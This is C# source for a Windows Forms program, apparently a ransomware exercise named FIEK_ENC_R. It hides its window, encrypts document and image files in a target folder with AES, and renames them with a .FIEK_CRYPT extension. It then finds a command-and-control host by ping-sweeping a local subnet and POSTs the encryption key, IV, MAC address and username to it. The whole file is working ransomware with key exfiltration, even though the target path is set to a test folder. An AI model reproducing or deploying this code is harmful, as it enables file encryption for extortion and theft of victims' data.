using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.Net;
using System.IO;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Diagnostics;

namespace FIEK_ENC_R
{
    public partial class Form1 : Form
    {

        Rijndael AES = Rijndael.Create(); // initialize the AES Symetric Algorithm 

        //Form1 constructor
        public Form1()
        {
            InitializeComponent();
            _init_();
        }// end of Form1()

        private void Form1_Load(object sender, EventArgs e)
        {
            _init_();
        }


        private void _init_() // function to initialize the procedure 
        {
            // code to initialize the encryption goes here 
            string c2s = getActiveC2();
            string username = Environment.UserName;
            string curr_dir = Environment.CurrentDirectory;
            string cmd_line = Environment.CommandLine; 
            string mac = mac_addr(); // get the MAC Address
            SetVisibleCore(false);  // Make the Form Invisible 
            this.ShowInTaskbar = false; // hide form from the taskbar

            /// GENERATE THE KEY 
            /// 
            Generate_Symetric_Key();

            /// SET TEST DIRECTORY TO ENCRYPT 
            /// 
            //Setting 
            string start_path = "C:\\Users\\Tester\\Desktop\\ENC_TST";

            /// START ENCRYPTING THE DIRECTORY
            /// 
            DIR_ENCRYPT(start_path);

            /// SEND INFO TO THE SERVER
            /// 
            SEND_INFO(c2s,mac, username);

        } // end of _init_

        // functuion to hide the form 
        protected override void SetVisibleCore(bool value)
        {
            if (!this.IsHandleCreated)
            {
                this.CreateHandle();
                value = false;
            }
        } // end of SetVisibleCore override 



        // function to get MAC Address 

        public string mac_addr()
        {
            string mac = "";
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {

                if (nic.OperationalStatus == OperationalStatus.Up && (!nic.Description.Contains("Virtual") &&
                    !nic.Description.Contains("Pseudo")))
                {
                    if (nic.GetPhysicalAddress().ToString() != "")
                    {
                        mac = nic.GetPhysicalAddress().ToString();
                    }
                }
            }

            return mac;
        } // end of MAC_ADD() - function to get the MAC Address 

        // function to encrypt a file 
        private void file_encrypt(string st)
        {

            FileStream fs = new FileStream(st, FileMode.Open);
            StreamReader r = new StreamReader(fs);
            string tmp = r.ReadToEnd();
            r.Close();
            fs.Close();
            FileStream fs_w = new FileStream(st, FileMode.Create);
            CryptoStream cs = new CryptoStream(fs_w, AES.CreateEncryptor(), CryptoStreamMode.Write);
            StreamWriter wr = new StreamWriter(cs);
            wr.Write(tmp);
            wr.Flush();
            cs.FlushFinalBlock();
            cs.Close();
            wr.Close();
            fs_w.Close();
           File.Move(st, st + "." + "FIEK_CRYPT");
           
        } // end of file_encrypt


        /// <summary>
        /// Function to encrypt files in a directory 
        /// Only files with certain excentions will be targeted 
        public void DIR_ENCRYPT(string dir_name)
        {
            //extensions to encrypt
            string[] ext = new[] { ".txt", ".doc", ".docx", ".pdf", ".jpg", ".jpeg", ".gif" };
            //get list of files in the targeted directory
            string[] files = Directory.GetFiles(dir_name);
            foreach (string f_h in files)
            {
                string extension = Path.GetExtension(f_h);
         
                if (ext.Contains(extension))
                {
                    file_encrypt(f_h);
                }
            }
        }// end of directory encrypt

        // function to send info to server
        public void SEND_INFO(string c2,string mac , string user)
        {
            string requestmethod = "POST";
            //AES.GenerateKey();
            string key_1 = Convert.ToBase64String(AES.Key);
            key_1 = request_url_encode(key_1);
            mac = request_url_encode(mac);
            user = request_url_encode(user);
            //richTextBox2.Text = key_1;
            string iv_1 = Convert.ToBase64String(AES.IV);
            iv_1 = request_url_encode(iv_1);
            string postData = "var1=" + key_1 + "&var2="+iv_1 + "&var3=" + mac + "&var4=" + user;

            //The Byte Array that will be used for writing the data to the stream.
            byte[] byteArray = Encoding.ASCII.GetBytes(postData);

            //The URL of the webpage to send the data to.
            string URL = "http://"+c2+"/Ushtrime/a3.php";
            string contenttype = "application/x-www-form-urlencoded";
            string responseFromServer = null;
            WebRequest request = WebRequest.Create(URL);
            Stream dataStream;
            WebResponse response;
            StreamReader reader;
            request.Method = requestmethod;
            request.ContentType = contenttype;
            request.ContentLength = byteArray.Length;
            dataStream = request.GetRequestStream();
            dataStream.Write(byteArray, 0, byteArray.Length);
            dataStream.Close();
        } // end of Send_Info()


        //function to generate Key for AES 256
        private void Generate_Symetric_Key()
        {
            AES.GenerateKey(); // Generate the AES Key
            AES.GenerateIV();  // Generate the AES IV for CBC mode 
        }//end of Genetare_Symetric_Key

        private string request_url_encode(string value)
        {
            value = value.Replace("+", @"%2B");
            value = value.Replace("/", @"%2F");
            value = value.Replace("=", @"%3D");

            return value;
        }

        private string getActiveC2()
        {
            string active_c2 = "";
            
            try
            {
                string localIP;
                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
                {
                    socket.Connect("8.8.8.8", 65530);
                    IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                    localIP = endPoint.Address.ToString();
                }

                Ping pingSender = new Ping();
                for (int i = 90; i < 120; i++)
                {
                    string ip = "192.168.10." + i.ToString();
                    if (ip == localIP)
                    {
                        continue;
                    }
                    else
                    {
                        
                        PingReply reply = pingSender.Send(ip);
                        if (reply.Status == IPStatus.Success)
                        {

                            active_c2 = ip;
                            break;
                        }
                        else
                        { 

                        }
                        
                    }
                }
               
            }
            catch (PingException EX)
            {
                MessageBox.Show(EX.ToString());
            }

            return active_c2;
        }
    }


}

